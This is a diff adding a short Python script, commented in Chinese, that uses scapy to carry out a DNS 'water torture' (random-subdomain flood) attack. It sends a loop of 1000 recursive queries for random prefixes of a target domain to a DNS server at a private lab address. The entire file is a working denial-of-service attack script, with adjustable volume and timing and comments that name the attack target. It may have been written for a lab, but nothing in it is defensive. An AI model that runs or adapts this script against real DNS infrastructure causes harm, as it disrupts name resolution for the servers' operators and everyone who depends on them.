@@ -1,0 +1,29 @@
+from scapy.all import IP, UDP, DNS, DNSQR, send
+import random
+import string
+import time
+
+# 配置目标信息
+dns_server = "192.168.32.143"  # 递归 DNS 服务器
+target_domain = "wang.com"  # 攻击目标域
+
+
+# 随机生成前缀函数
+def generate_random_prefix(length=6):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+# 发送随机前缀的 DNS 查询请求
+def send_water_torture_request():
+    random_prefix = generate_random_prefix()
+    domain_to_query = f"{random_prefix}.{target_domain}"
+    
+    # 构造 DNS 请求
+    dns_request = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain_to_query))
+    print(random_prefix)
+    send(dns_request, verbose=0)
+
+# 执行攻击循环
+for _ in range(1000):  # 调整发送数量
+    send_water_torture_request()
+    time.sleep(0.05)  # 调整请求间隔
+    print("Sent water torture request with random prefix")
